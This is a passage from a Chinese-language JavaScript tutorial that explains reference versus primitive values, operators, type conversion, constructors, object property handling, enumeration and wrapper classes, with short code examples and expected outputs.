<p>如果我们给arr重新赋值一个新的数组的话，那么arr1并不是这个新的数组。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];<span class="comment">// 重新开辟了一个堆空间</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1);<span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure></p>
<p>因为原始值是存放在栈里面的，而引用值是存放在堆里面的，原始值的赋值是把值的内容赋值给另一个变量，但是引用值却不是这样。引用值的变量名存在栈里面，但是值却是存在堆里面的，栈里面的变量名只是指向了一个堆空间，这个堆空间存的是我们一开始赋的值，当我们写arr1 = arr的时候，其实是把arr1指向了和arr指向的同一个堆空间，这样当我们改变arr的内容的时候，其实就是改变这个堆空间的内容，自然同样指向这个堆空间的arr1的值也随着改变了。</p>
<p>栈内存不同，它被赋值后就不可以改变了，即使我们给num重新赋值为234，也是在栈里面重新开辟了一块空间赋值234，前面存放123的空间还存在，只是没有指针指向这里罢了。</p>
<p>两种数据类型的第二点区别是：原始值不可以被改变，引用值可以被改变。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">arr.length = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">//1,2</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">"1234"</span>;</span><br><span class="line">str.length = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str);<span class="comment">//1234</span></span><br></pre></td></tr></table></figure></p>
<p>这里涉及了一个包装类的概念，我们后面会提到。</p>
<h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>1.+ 运算符</p>
<p>作用：</p>
<p>1.数学上相加的功能</p>
<p>2.拼接字符串</p>
<p>字符串和任何数据相加都会变成字符串<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">1</span> + <span class="number">2</span> + <span class="string">"3"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(num);<span class="comment">//33</span></span><br></pre></td></tr></table></figure></p>
<p>2.– 运算符</p>
<p>数学上的相减功能</p>
<p>3.* 运算符</p>
<p>数学上的相乘功能</p>
<p>4./ 运算符</p>
<p>数学上的相除功能</p>
<p>5.% 运算符</p>
<p>数学上的取余功能</p>
<p>6.= 运算符</p>
<p>赋值运算符</p>
<p>7.== 运算符</p>
<p>比较运算符中的等于，不属于严格等于，严格等于是”===”三个等号</p>
<p>8.() 运算符</p>
<p>和数学上一样，加括号的部分优先级高</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">1</span> + <span class="string">"2"</span> + (<span class="number">1</span> + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(num);<span class="comment">//122</span></span><br></pre></td></tr></table></figure>
<p>9.++ 运算符</p>
<p>自加一运算，当写在变量前面的时候是先加1再执行运算，写在变量后面的时候是先运算再加1。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(num ++);<span class="comment">//1</span></span><br><span class="line"><span class="built_in">console</span>.log(num);<span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log(++num);<span class="comment">//3</span></span><br><span class="line"><span class="built_in">console</span>.log(num);<span class="comment">//3</span></span><br></pre></td></tr></table></figure>
<p>相类似的运算还有—- 运算符</p>
<p>10.+= 运算符</p>
<p>让变量加多少<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">1</span>;</span><br><span class="line">num += <span class="number">10</span>;</span><br><span class="line"><span class="built_in">console</span>.log(num);<span class="comment">//11</span></span><br></pre></td></tr></table></figure></p>
<p>相类似的还有 -=、/=、*-、%= 等等</p>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>比较运算符有 &gt; 、&lt; 、&gt;= 、&lt;= 、!= 、==、不严格等于、===严格等于。</p>
<p>下面介绍一下不严格等于和严格等于的区别</p>
<p>不严格等于是当我们比较两个数据的时候，是先转化成同一个类型的数据之后再进行比较的，而严格等于是两个数据不进行数据转化也相等。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">"2"</span> === <span class="number">2</span><span class="comment">//false</span></span><br><span class="line"><span class="string">"2"</span> == <span class="number">2</span><span class="comment">//true</span></span><br></pre></td></tr></table></figure></p>
<p>NaN不等于任何数据，包括它本身，但undefined就等于它本身。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">NaN</span> == <span class="literal">NaN</span><span class="comment">//false</span></span><br><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span><span class="comment">//false</span></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">undefined</span><span class="comment">//true</span></span><br><span class="line"><span class="literal">undefined</span> === <span class="literal">undefined</span><span class="comment">//true</span></span><br><span class="line"><span class="keyword">var</span> demo = !!<span class="string">"abc"</span>;<span class="comment">//true</span></span><br></pre></td></tr></table></figure></p>
<p>这里的demo要进行取反运算，先进行了类型转换为布尔值false，再次取反之后为true，取反运算可以用来将数据转换成布尔值。</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>逻辑运算符主要有 &amp;&amp; 和 || （与和或）<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="number">1</span> &lt; <span class="number">2</span> &amp;&amp; <span class="number">3</span>;<span class="comment">//3</span></span><br></pre></td></tr></table></figure></p>
<p>&amp;&amp;的作用是只有是true的时候，才会继续往后执行，一旦第一个表达式就错了，后面的第二个表达式根本不执行。如果前面表达式的返回结果都是true的话，那么&amp;&amp;的返回结果就是最后一个表达式的结果，如样例中的demo是3。</p>
<p>||的作用是只要有一个表达式是true，那么就结束，后面的就不走了，返回的结果就是这个正确的表达式的结果，如果前面的表达式都是false的话，那么返回结果就是最后一个表达式的结果。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="number">2</span> &lt; <span class="number">1</span> || (<span class="number">1</span> == <span class="number">1</span>);<span class="comment">//true</span></span><br></pre></td></tr></table></figure></p>
<p>&amp;&amp;有当做短路语句的作用，比如我们可以把简单的if语句用&amp;&amp;来写，因为只有第一个条件成立的时候，才会运行第二个表达式。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(flag) &#123; <span class="built_in">console</span>.log(<span class="string">"hello"</span>); &#125;;</span><br><span class="line">flag &amp;&amp; <span class="built_in">console</span>.log(<span class="string">"hello"</span>);</span><br></pre></td></tr></table></figure></p>
<p>||有赋初始值的作用，有时候我们希望函数参数有一个初始值，在不使用ES6的语法的情况下，可以使用或语句。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span> (<span class="params">example</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> example = example || <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>不过这里有一个缺点，当我们传的参数是一个布尔值且为false时，会忽略掉我们传递的这个参数值而取默认初始值，ES6中的默认赋值方式可以避免这个问题。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span> (<span class="params">example = <span class="number">100</span></span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="默认为false的值"><a href="#默认为false的值" class="headerlink" title="默认为false的值"></a>默认为false的值</h3><p>所有的值都可以被转换成true或false，转换成true的值实在太多了，我们只需记住转换成false的值即可，其他的都是true。</p>
<p>默认为false：<br>false、undefined、null、””、NaN、0(+0、-0)。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="literal">undefined</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="literal">null</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="string">""</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="literal">NaN</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="number">0</span>));<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Boolean</span>(<span class="literal">false</span>));<span class="comment">//false</span></span><br></pre></td></tr></table></figure></p>
<h3 id="显示类型转换"><a href="#显示类型转换" class="headerlink" title="显示类型转换"></a>显示类型转换</h3><p>操作符typeof可以检测数据的类型。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(<span class="number">123</span>));<span class="comment">//number</span></span><br></pre></td></tr></table></figure></p>
<p>typeof能返回的类型一共只有6种：</p>
<p>number、string、boolean、undefined、object、function</p>
<p>• 数组和null类型都属于object，null通常用来作为对象占位符，所以归到了object里面。</p>
<p>• NaN属于number类型。非数也是数字的一种。</p>
<p>• typeof返回的结果是字符串</p>
<p>1.Number(mix)</p>
<p>这个方法可以把其他类型的数据转换成数字类型的数据<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="string">"123"</span>) <span class="comment">// 123</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">true</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">undefined</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure></p>
<p>2.parseInt(string, radix)</p>
<p>这个方法可以将字符串转换成整型数字，第二个参数radix基底是可选参数,它的范围是2~36。</p>
<p>当参数string里面既包括数字字符串又包括其他字符串的时候，它看到其他字符串就不会继续转换后面的数字型字符串了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">"123abc345"</span>)<span class="comment">//123</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">"abc123"</span>)<span class="comment">//NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">"123"</span>)<span class="comment">//123</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">"abc"</span>)<span class="comment">//NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="literal">true</span>)<span class="comment">//NaN</span></span><br></pre></td></tr></table></figure></p>
<p>第二个参数radix作用是，把第一个参数的数字当成几进制数字来转换成十进制。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="number">11</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">parseInt</span>(demo, <span class="number">16</span>));<span class="comment">//17</span></span><br></pre></td></tr></table></figure></p>
<p>3.parseFloat(string)</p>
<p>这个方法和parseInt方法类似，是将字符串转换成浮点类型的数字，同样是碰到第一个非数字型的字符停止，但是由于浮点型数据有小数点，所以它还会识别第一个小数点以及后面的数字，但是第二个小数点就无法识别了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>(<span class="string">"123.2.3"</span>)<span class="comment">//123.2</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">"123.2abc"</span>);<span class="comment">//123.2</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">"123.abc"</span>)<span class="comment">//123</span></span><br></pre></td></tr></table></figure></p>
<p>4.toString(radix)</p>
<p>这个方法是对象上的方法，绝大多数数据类型都可以使用（undefined和null没有toString方法），它将数据转换成字符串类型，涉及到包装类的一些知识。radix是可选参数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="number">123</span>;</span><br><span class="line">demo.toString();<span class="comment">//'123'</span></span><br><span class="line"><span class="literal">true</span>.toString()<span class="comment">//'true'</span></span><br></pre></td></tr></table></figure></p>
<p>当写radix基底的时候，代表我们要将这个数字转化成几进制的数字型字符串。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="number">10</span>;</span><br><span class="line">demo.toString(<span class="number">16</span>)<span class="comment">//a</span></span><br></pre></td></tr></table></figure></p>
<p>5.String(mix)</p>
<p>把任何类型转换成字符串类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span>(<span class="built_in">String</span>(<span class="number">123</span>));<span class="comment">//string</span></span><br></pre></td></tr></table></figure>
<p>6.Boolean(mix)</p>
<p>把任何类型转换成布尔类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>(<span class="number">0</span>);<span class="comment">//false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="literal">undefined</span>);<span class="comment">//false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="literal">null</span>);<span class="comment">//false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="string">""</span>);<span class="comment">//false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="literal">NaN</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><p>1.isNaN()</p>
<p>这个方法可以检测数据是不是非数类型。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isNaN</span>(<span class="literal">NaN</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="string">"abc"</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="number">123</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure></p>
<p>这中间隐含了隐式转换，它会先将你传的参数调用一下Number方法之后，再看看结果是不是NaN。</p>
<p>2.算术运算符</p>
<p>++会将数据调用一遍Number之后，再自加一。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="string">"abc"</span>;</span><br><span class="line">demo ++;<span class="comment">//NaN</span></span><br><span class="line">demo = <span class="string">"123"</span>;</span><br><span class="line">++demo;<span class="comment">//124</span></span><br><span class="line">demo = <span class="string">"123"</span>；</span><br><span class="line">demo++;<span class="comment">//123 而非  "123"</span></span><br></pre></td></tr></table></figure></p>
<p>++放在后面，虽然是执行完之后才加一，但是执行之前就会调用Number进行类型转换。</p>
<p>3.一目运算符</p>
<p>+、-、*、/在执行之前都会先进行类型转换，转换成数字类型再进行运算。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="literal">false</span>;</span><br><span class="line">+num;<span class="comment">//0</span></span><br><span class="line"><span class="keyword">var</span> demo = <span class="literal">true</span>;</span><br><span class="line">-demo;<span class="comment">//-1</span></span><br><span class="line"><span class="keyword">var</span> demo = <span class="string">"abc"</span>;</span><br><span class="line">+demo;<span class="comment">//NaN</span></span><br><span class="line"><span class="number">1</span> * <span class="string">"2"</span>;<span class="comment">//2</span></span><br><span class="line"><span class="literal">true</span> * <span class="literal">false</span>;<span class="comment">//0</span></span><br><span class="line"><span class="literal">false</span> / <span class="literal">false</span>;<span class="comment">//NaN</span></span><br><span class="line"><span class="literal">true</span> / <span class="literal">false</span>;<span class="comment">//infinity无穷大</span></span><br><span class="line">-<span class="literal">true</span> / <span class="literal">false</span>;<span class="comment">//-infinity</span></span><br></pre></td></tr></table></figure>
<p>4.逻辑运算符</p>
<p>&amp;&amp;和||都是先把表达式调用Boolean，换成布尔值再进行判断是true还是false，不过返回的结果还是本身表达式的结果。</p>
<p>5.！取反操作符</p>
<p>返回的结果也是调用Boolean方法之后的结果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="string">"abc"</span>;<span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<p>当然也有不发生类型转换的比较运算符</p>
<p>===严格等于</p>
<p>!==严格不等于</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">"123"</span> === <span class="number">123</span>;<span class="comment">//false</span></span><br><span class="line"><span class="literal">true</span> === <span class="string">"true"</span>;<span class="comment">// false</span></span><br><span class="line"><span class="number">1</span> !== <span class="string">"1"</span>;<span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> !== <span class="number">1</span>;<span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h3 id="对象创建方法"><a href="#对象创建方法" class="headerlink" title="对象创建方法"></a>对象创建方法</h3><p>对象的创建方法有三种：</p>
<p>1.对象字面量<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br></pre></td></tr></table></figure></p>
<p>这样方式叫做字面量，是我们创建对象最简单、最常用的方法。</p>
<p>对象里面有属性，属性之间用逗号分隔，每一条属性都有属性名和属性值，属性名和属性值之间用冒号分隔。</p>
<p>2.构造函数</p>
<p>构造函数分两种：系统自带的构造函数和我们自定义的构造函数。</p>
<p>我们先介绍下系统自带的构造函数</p>
<p>创建对象的构造函数是Object</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br></pre></td></tr></table></figure>
<p>通过这条语句，我们创建了一个空对象。</p>
<p>它和<code>var obj = {};</code>的作用是一样的。</p>
<p>系统自带的构造函数还有很多，比如Number、String、Boolean、Array。</p>
<p>我们常用的还是自定义构造函数</p>
<p>自定义构造函数也是正常的函数，我们为了区分它们，我们一般会把构造函数的首字母大写。</p>
<p>这里就声明了一个构造函数Person。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>有了构造函数后，我们就可以用new操作符来创建对象了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">typeof</span> oPerson;<span class="comment">//object</span></span><br></pre></td></tr></table></figure>
<p>这里我们创建了一个对象person，不过现在这个对象是空对象，因为我们构造函数什么都没有写，我们也没有给这个对象添加任何属性。</p>
<p>另外，用new操作符创建出来的对象，尽管都是使用的是同一个构造函数，但是对象之间是没有关联的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person();</span><br><span class="line">person1.name = <span class="string">"111"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person2.name);<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>
<p>person1和person2之间没有关联，它们是两个单独的对象。</p>
<p>我们在构造函数里面写一些对象默认就有的属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">"scarlett"</span>,</span><br><span class="line">  <span class="keyword">this</span>.age = <span class="number">17</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person();</span><br><span class="line">person.name;<span class="comment">//scarlett</span></span><br></pre></td></tr></table></figure>
<p>当然构造函数既然是函数，那么就可以传参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person(<span class="string">"scarlett"</span>, <span class="number">18</span>);</span><br><span class="line">person.age;<span class="comment">//18</span></span><br></pre></td></tr></table></figure>
<p>创建对象的时候，只有使用new操作符才会有this。</p>
<p>为什么我们通过new操作符可以创建互相独立的对象呢？</p>
<p>其实，当我们调用new操作符的时候，这个new在我们的构造函数里面隐式创建了一个this对象，并且最后返回了这个this对象，这就是为什么我们通过new可以创建一个对象的原因。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//var this = &#123;&#125;;</span></span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="comment">//retrun this;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们在构造函数首行手动创建一个对象，比如that对象，然后最后返回that，那么里面的this就没有用了，这样我们为属性赋值就要用that了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> that = &#123;</span><br><span class="line">    name: <span class="string">"scarlett"</span></span><br><span class="line">  &#125;;</span><br><span class="line">  that.name = name;</span><br><span class="line">  <span class="keyword">return</span> that;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person(<span class="string">"demo"</span>);</span><br><span class="line">person.name;<span class="comment">//demo</span></span><br></pre></td></tr></table></figure>
<p>如果我们最后返回对象，那么this就失效。如果最后显示返回的是原始值，那么this还是有效的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> that = &#123;&#125;;</span><br><span class="line">    that.name = <span class="string">"that"</span>;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">"this"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person();</span><br><span class="line">person.name;<span class="comment">//this</span></span><br></pre></td></tr></table></figure></p>
<h3 id="对象属性的增删改查"><a href="#对象属性的增删改查" class="headerlink" title="对象属性的增删改查"></a>对象属性的增删改查</h3><p>1.增</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.name = <span class="string">"scarlett"</span>;</span><br><span class="line">obj.name;<span class="comment">//scarlett</span></span><br></pre></td></tr></table></figure>
<p>我们可以通过对象名+点+属性名的方式来给对象添加新的属性并赋值。</p>
<p>2.改</p>
<p>修改操作和增加操作其实是一样的，只要调用相同的属性名然后赋一个新值就可以了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">"scarlett"</span></span><br><span class="line">&#125;</span><br><span class="line">obj.name = <span class="string">"demo"</span>;</span><br><span class="line">obj.name;<span class="comment">//demo</span></span><br></pre></td></tr></table></figure>
<p>3.查</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.name = <span class="string">'demo'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj.name);<span class="comment">//demo</span></span><br></pre></td></tr></table></figure>
<p>4.删</p>
<p>删除属性的操作我们需要借助delete操作符<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">"scarlett"</span></span><br><span class="line">&#125;</span><br><span class="line">obj.name;<span class="comment">//scarlett</span></span><br><span class="line"><span class="keyword">delete</span> obj.name;</span><br><span class="line">obj.name;<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></p>
<h3 id="对象的枚举"><a href="#对象的枚举" class="headerlink" title="对象的枚举"></a>对象的枚举</h3><p>查看对象属性我们知道可以用obj.name这样的点操作符来查看，但是我们还有一种其它方式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj[<span class="string">'name'</span>]</span><br></pre></td></tr></table></figure>
<p>这样我们就可以用for-in操作符来遍历对象了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">"scarlett"</span>,</span><br><span class="line">  age: <span class="number">18</span>,</span><br><span class="line">  sex: <span class="string">"female"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(prop + <span class="string">":"</span> + obj[prop]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们for-in循环会按照属性的顺序取出属性名然后赋给prop，for-in循环会把原型里面的属性一起打印出来。</p>
<p>下面我们介绍三种操作符</p>
<p>1.hasOwnProperty</p>
<p>这个操作符的作用是查看当前这个属性是不是对象自身的属性，在原型链上的属性会被过滤掉。如果是自身的，就返回true，否则返回false。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">"scarlett"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  age: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> oPerson = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> prop <span class="keyword">in</span> oPerson) &#123;</span><br><span class="line">  <span class="keyword">if</span>(oPerson.hasOwnProperty(prop)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(oPerson[prop]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样，我们的for-in循环只会打印自身的name属性而不会打印原型上的age属性。</p>
<p>2.in操作符</p>
<p>这个操作符的作用是查看一个属性是不是在这个对象或者它的原型上<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">"name"</span> <span class="keyword">in</span> oPerson;<span class="comment">//true</span></span><br><span class="line"><span class="string">"age"</span> <span class="keyword">in</span> oPerson;<span class="comment">//true</span></span><br><span class="line"><span class="string">"sex"</span> <span class="keyword">in</span> oPerson;<span class="comment">//false</span></span><br></pre></td></tr></table></figure></p>
<p>3.instanceof操作符</p>
<p>这个操作符的作用是查看前面的对象是不是后面的构造函数构造出来的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">oPerson <span class="keyword">instanceof</span> Person;<span class="comment">//true</span></span><br><span class="line">oPerson <span class="keyword">instanceof</span> <span class="built_in">Object</span>;<span class="comment">//true</span></span><br><span class="line">&#123;&#125; <span class="keyword">instanceof</span> <span class="built_in">Object</span>;<span class="comment">//true</span></span><br><span class="line">&#123;&#125; <span class="keyword">instanceof</span> Person;<span class="comment">//false</span></span><br></pre></td></tr></table></figure></p>
<p>也可以理解为：后面的构造器的原型是否在前面对象的原型链上。</p>
<h3 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h3><p>我们前面提到过，原始值是不可以改变的，只有对象才有属性和方法，那么这个又是什么情况呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abcd"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.length);<span class="comment">//4</span></span><br></pre></td></tr></table></figure>
<p>按理说字符串是原始值，是没有属性的，但是这里确实可以查看length这个属性。</p>
<p>这里就涉及到一个叫做包装类的知识了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">str.length</span><br></pre></td></tr></table></figure>
<p>我们在调用执行这一行代码之前，程序会自动把str包装成一个字符串对象，在这一行代码执行完毕之后再销毁这个字符串对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abcd"</span>;</span><br><span class="line"><span class="comment">//var str1 = new String("abcd");</span></span><br><span class="line">str.length;<span class="comment">//str1.length</span></span><br><span class="line"><span class="comment">//销毁str1</span></span><br></pre></td></tr></table></figure>
<p>这里的str.length的str其实是上一句包装好的str1。str1是对象，上面有属性和方法，然后就可以打印length属性了。在执行完str.length这一行代码后，str1这个对象就被销毁了。</p>
<p>这也就是为什么我们在执行str.length = 2这句话之后，再打印str.length还是4的原因。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abcd"</span>;</span><br><span class="line"><span class="comment">//var str1 = String("abcd");</span></span><br><span class="line">str.length = <span class="number">2</span>;<span class="comment">//str1.length = 2;</span></span><br><span class="line"><span class="comment">//销毁str1</span></span><br><span class="line"><span class="built_in">console</span>.log(str);<span class="comment">//abcd长度还是4</span></span><br></pre></td></tr></table></figure></p>
<p>其他类型的数据也是一样的，当我们给原始值加属性的时候，都是先隐式包装成对象，然后赋完属性值之后再销毁这个对象。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bool = <span class="literal">true</span>;</span><br><span class="line">bool.len = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">console</span>.log(bool.len);</span><br></pre></td></tr></table></figure></p>
<h3 id="数组的声明"><a href="#数组的声明" class="headerlink" title="数组的声明"></a>数组的声明</h3><p>数组的声明方式一共有两种：</p>
<p>1.字面量方式声明数组。</p>
